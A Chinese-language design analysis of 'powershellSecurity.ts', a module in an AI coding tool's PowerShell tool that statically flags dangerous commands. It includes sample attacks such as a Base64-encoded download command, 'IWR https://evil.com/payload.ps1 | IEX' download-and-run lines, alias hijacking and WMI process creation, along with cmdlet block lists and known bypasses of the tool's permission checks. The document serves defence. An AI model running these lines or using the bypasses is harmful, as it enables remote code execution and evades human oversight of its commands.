# PowerShell Security Analysis (`powershellSecurity.ts`)

## 场景与职责

`powershellSecurity.ts` 是 Claude Code 中 PowerShell 工具的核心安全分析模块，负责对用户输入的 PowerShell 命令进行静态安全检测。该模块通过分析 PowerShell 抽象语法树（AST）来识别潜在的危险代码模式，防止恶意命令执行。

**核心职责：**
1. 检测代码注入攻击（Invoke-Expression、动态命令名等）
2. 识别下载执行模式（Download Cradles）
3. 阻止权限提升操作（UAC 绕过、特权执行）
4. 拦截 .NET 代码编译和加载（Add-Type、COM 对象）
5. 检测编码命令和混淆技术
6. 验证 Constrained Language Mode (CLM) 类型安全

**在系统中的位置：**
- 被 `powershellPermissions.ts` 调用，作为权限检查流程的一部分
- 与 `readOnlyValidation.ts`、`modeValidation.ts` 协同工作
- 依赖 `parser.ts` 提供的 AST 解析结果

## 功能点目的

### 1. 主入口函数 `powershellCommandIsSafe`

```typescript
export function powershellCommandIsSafe(
  _command: string,
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult
```

**目的：** 协调所有安全检查器，按优先级顺序执行验证。

**返回值：**
- `behavior: 'passthrough'` - 检查通过，继续后续处理
- `behavior: 'ask'` - 检测到风险，需要用户确认
- `message` - 风险描述信息

**检查器执行顺序（关键）：**
1. `checkInvokeExpression` - Invoke-Expression/iex 检测
2. `checkDynamicCommandName` - 动态命令名检测
3. `checkEncodedCommand` - 编码命令检测
4. `checkPwshCommandOrFile` - 嵌套 PowerShell 进程检测
5. `checkDownloadCradles` - 下载执行模式检测
6. `checkDownloadUtilities` - 独立下载工具检测
7. `checkAddType` - .NET 代码编译检测
8. `checkComObject` - COM 对象实例化检测
9. `checkDangerousFilePathExecution` - 危险文件路径执行检测
10. `checkInvokeItem` - Invoke-Item 执行检测
11. `checkScheduledTask` - 计划任务创建检测
12. `checkForEachMemberName` - ForEach-Object -MemberName 检测
13. `checkStartProcess` - Start-Process 特权提升检测
14. `checkScriptBlockInjection` - 脚本块注入检测
15. `checkSubExpressions` - 子表达式检测
16. `checkExpandableStrings` - 可扩展字符串检测
17. `checkSplatting` - 参数展开检测
18. `checkStopParsing` - 停止解析令牌检测
19. `checkMemberInvocations` - .NET 方法调用检测
20. `checkTypeLiterals` - 类型字面量检测
21. `checkEnvVarManipulation` - 环境变量修改检测
22. `checkModuleLoading` - 模块加载检测
23. `checkRuntimeStateManipulation` - 运行时状态修改检测
24. `checkWmiProcessSpawn` - WMI/CIM 进程创建检测

### 2. 编码命令检测 (`checkEncodedCommand`)

**检测目标：** `-EncodedCommand` / `-e` 参数

**攻击场景：** 攻击者使用 Base64 编码隐藏恶意命令内容，绕过简单的字符串匹配。

**PoC 示例：**
```powershell
pwsh -e "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcABzADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQA="
```

**技术实现：**
- 检测 `pwsh` / `powershell` 可执行文件
- 使用 `psExeHasParamAbbreviation` 匹配参数缩写
- 支持多种参数前缀字符（`-`, `/`, en-dash, em-dash, horizontal bar）

### 3. 下载执行检测 (`checkDownloadCradles`)

**检测目标：** IWR/IRM + IEX 组合

**攻击场景：** 常见的 "下载并执行" 攻击模式：
```powershell
# 管道形式
IWR https://evil.com/payload.ps1 | IEX

# 分语句形式
$r = IWR https://evil.com/payload.ps1; IEX $r.Content
```

**技术实现：**
- 识别下载器：Invoke-WebRequest (iwr)、Invoke-RestMethod (irm)、New-Object、Start-BitsTransfer
- 识别执行器：Invoke-Expression (iex)
- 跨语句检测：即使下载和执行在不同语句中也能捕获

### 4. COM 对象检测 (`checkComObject`)

**检测目标：** `New-Object -ComObject`

**风险：** COM 对象如 WScript.Shell、Shell.Application 具有独立的执行能力，无需 IEX 即可执行代码。

**技术实现：**
- 检测 `-ComObject` 参数（支持缩写 `-com`）
- 同时检查 `-TypeName` 参数的类型安全（通过 `isClmAllowedType`）

### 5. 类型字面量检测 (`checkTypeLiterals`)

**检测目标：** `[TypeName]` 语法

**设计理念：** 复用 Microsoft PowerShell Constrained Language Mode (CLM) 的类型白名单。

**CLM 允许的类型示例：**
- 基础类型：int, string, bool, array, hashtable
- PS 特定类型：PSCredential, PSCustomObject, PSObject
- 网络类型：IPAddress, MailAddress, Uri
- 验证属性：ValidateScript, ValidateSet, ValidatePattern

**被移除的危险类型：**
- `adsi`, `adsisearcher` - Active Directory 网络绑定
- `wmi`, `wmiclass`, `wmisearcher`, `cimsession` - WMI 远程查询

### 6. 运行时状态修改检测 (`checkRuntimeStateManipulation`)

**检测目标：**
- `Set-Alias` / `New-Alias` - 别名劫持
- `Set-Variable` / `New-Variable` - 变量污染（如 `$PSDefaultParameterValues`）

**攻击场景：**
```powershell
Set-Alias Get-Content Invoke-Expression
Get-Content $maliciousPayload  # 实际执行 IEX
```

### 7. WMI/CIM 进程创建检测 (`checkWmiProcessSpawn`)

**检测目标：** `Invoke-WmiMethod` / `Invoke-CimMethod`

**攻击场景：**
```powershell
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c calc"
```

**绕过风险：** 这些 cmdlet 可以创建进程，完全绕过 `checkStartProcess` 的检测。

## 具体技术实现

### 参数前缀处理

PowerShell 的 tokenizer 接受多种 dash 字符作为参数前缀：

```typescript
const PS_ALT_PARAM_PREFIXES = new Set([
  '/',           // Windows PowerShell 5.1
  '\u2013',      // en-dash
  '\u2014',      // em-dash  
  '\u2015',      // horizontal bar
])
```

`psExeHasParamAbbreviation` 函数统一处理这些变体：
1. 首先尝试原始匹配
2. 将替代前缀标准化为 `-` 后重新匹配
3. 支持冒号绑定值（`-Param:Value`）

### 动态命令名检测

```typescript
function checkDynamicCommandName(parsed: ParsedPowerShellCommand): PowerShellSecurityResult
```

**检测逻辑：**
- 命令名元素类型必须是 `'StringConstant'`
- 其他类型（VariableExpressionAst、IndexExpressionAst、BinaryExpressionAst）都表示动态解析

**PoC 示例：**
```powershell
& ${function:Invoke-Expression} 'payload'  # VariableExpressionAst → 'Other'
& ('iex','x')[0] 'payload'                 # IndexExpressionAst → 'Other'
& ('i'+'ex') 'payload'                     # BinaryExpressionAst → 'Other'
```

### 脚本块注入检测

```typescript
function checkScriptBlockInjection(parsed: ParsedPowerShellCommand): PowerShellSecurityResult
```

**安全脚本块使用者（允许）：**
- `Where-Object`, `Sort-Object`, `Select-Object`, `Group-Object`
- `Format-Table`, `Format-List`, `Format-Wide`, `Format-Custom`

**危险脚本块使用者（阻止）：**
- `Invoke-Command`, `Invoke-Expression`, `Start-Job`
- `Start-ThreadJob`, `Register-ScheduledJob`
- `Register-EngineEvent`, `Register-ObjectEvent`, `Register-WmiEvent`
- `New-PSSession`, `Enter-PSSession`

## 关键代码路径与文件引用

### 核心类型定义

```typescript
// 文件: src/tools/PowerShellTool/powershellSecurity.ts:30-33
type PowerShellSecurityResult = {
  behavior: 'passthrough' | 'ask' | 'allow'
  message?: string
}
```

### 主检查流程

```typescript
// 文件: src/tools/PowerShellTool/powershellSecurity.ts:1042-1090
export function powershellCommandIsSafe(
  _command: string,
  parsed: ParsedPowerShellCommand,
): PowerShellSecurityResult {
  if (!parsed.valid) {
    return { behavior: 'ask', message: 'Could not parse command...' }
  }

  const validators = [
    checkInvokeExpression,
    checkDynamicCommandName,
    // ... 24 个检查器
    checkWmiProcessSpawn,
  ]

  for (const validator of validators) {
    const result = validator(parsed)
    if (result.behavior === 'ask') {
      return result
    }
  }
  return { behavior: 'passthrough' }
}
```

### 关键导入依赖

```typescript
// 文件: src/tools/PowerShellTool/powershellSecurity.ts:11-28
import {
  DANGEROUS_SCRIPT_BLOCK_CMDLETS,
  FILEPATH_EXECUTION_CMDLETS,
  MODULE_LOADING_CMDLETS,
} from '../../utils/powershell/dangerousCmdlets.js'
import {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'
import {
  COMMON_ALIASES,
  commandHasArgAbbreviation,
  deriveSecurityFlags,
  getAllCommands,
  getVariablesByScope,
  hasCommandNamed,
} from '../../utils/powershell/parser.js'
import { isClmAllowedType } from './clmTypes.js'
```

## 依赖与外部交互

### 上游依赖（输入）

| 文件 | 依赖内容 | 用途 |
|------|----------|------|
| `parser.ts` | `ParsedPowerShellCommand`, `ParsedCommandElement` | AST 解析结果 |
| `parser.ts` | `getAllCommands()`, `hasCommandNamed()`, `deriveSecurityFlags()` | 命令遍历和标志提取 |
| `parser.ts` | `COMMON_ALIASES`, `commandHasArgAbbreviation()` | 别名解析和参数匹配 |
| `dangerousCmdlets.ts` | `DANGEROUS_SCRIPT_BLOCK_CMDLETS` | 危险脚本块命令列表 |
| `dangerousCmdlets.ts` | `FILEPATH_EXECUTION_CMDLETS` | 文件路径执行命令列表 |
| `dangerousCmdlets.ts` | `MODULE_LOADING_CMDLETS` | 模块加载命令列表 |
| `clmTypes.ts` | `isClmAllowedType()` | CLM 类型白名单验证 |

### 下游消费（输出）

| 文件 | 消费方式 | 用途 |
|------|----------|------|
| `powershellPermissions.ts` | `powershellCommandIsSafe()` | 权限检查流程中的安全验证 |

### 数据流

```
用户输入命令
    ↓
parser.ts::parsePowerShellCommand() → ParsedPowerShellCommand
    ↓
powershellSecurity.ts::powershellCommandIsSafe()
    ↓
PowerShellSecurityResult (ask/passthrough)
    ↓
powershellPermissions.ts (决策整合)
```

## 风险、边界与改进建议

### 已知风险

1. **AST 解析失败降级**
   - 当 `parsed.valid === false` 时，所有检查器跳过，返回 `ask`
   - 攻击者可能构造超长命令触发解析失败，但此降级是 fail-safe 的

2. **Unicode 同形字符攻击**
   - 已实现防御：非 ASCII 字符（`[\u0080-\uFFFF]`）的命令名被分类为 `'application'`
   - 阻止了如 `ſtart-proceſſ` → `Start-Process` 的绕过

3. **参数前缀混淆**
   - 已实现防御：`psExeHasParamAbbreviation` 处理多种 dash 字符

4. **冒号绑定参数绕过**
   - 已实现防御：`children[]` 数组暴露参数绑定值的 AST 类型

### 边界限制

1. **静态分析局限**
   - 无法追踪变量值流：`$cmd = "Invoke-Expression"; & $cmd` 会被检测（动态命令名），但 `$path = "/etc/passwd"; Get-Content $path` 需要额外验证

2. **嵌套表达式深度**
   - 复杂嵌套表达式可能超出 AST 遍历范围

3. **外部命令参数**
   - 传递给原生可执行程序的参数（如 `git -c core.pager=sh`）需要专门的验证逻辑

### 改进建议

1. **增强类型推断**
   - 对简单变量赋值进行常量传播分析
   - 示例：如果 `$path = "/safe/path"` 且后续 `Get-Content $path`，可视为安全

2. **细粒度脚本块分析**
   - 对 `Where-Object` / `ForEach-Object` 的脚本块进行深度分析
   - 当前仅检查命令名，不检查脚本块内部

3. **网络请求检测**
   - 扩展下载检测，覆盖更多网络相关 cmdlet（如 `Get-WmiObject` 的远程查询）

4. **性能优化**
   - 检查器列表较长（24 个），可考虑按风险优先级分层执行
   - 低风险命令快速路径，高风险命令完整检查

5. **误报减少**
   - 对 `Start-Process` 的 PowerShell 可执行文件检测可更精确
   - 区分 `-ArgumentList` 中的 PowerShell 参数和子进程参数

### 安全审计记录

根据代码注释，该模块经历了多次安全审查和修复：

- **Finding #14**: 修复 `-Verb RunAs` 的 colon 语法绕过（`-Verb:'RunAs'`）
- **Finding #18**: 新增符号链接创建检测
- **Finding #31**: 修复 Unicode 同形字符绕过
- **Finding #32**: 新增 `argLeaksValue` 检查防止变量泄露
- **Finding #34**: 新增 WMI/CIM 进程创建检测
- **Finding #36**: 修复 UTF-8 多字节字符命令长度计算
- **Bug #6**: 修复冒号绑定值中的引号处理
- **Bug #10**: 修复多语句命令的模块前缀处理
- **Bug #14**: 修复 backtick 转义绕过
- **Bug #22**: 修复参数名中的 backtick 转义
- **Bug #25**: 修复 `Set-Location .` 的 CWD 检测
- **Bug #26**: 修复 Unicode dash 前缀处理
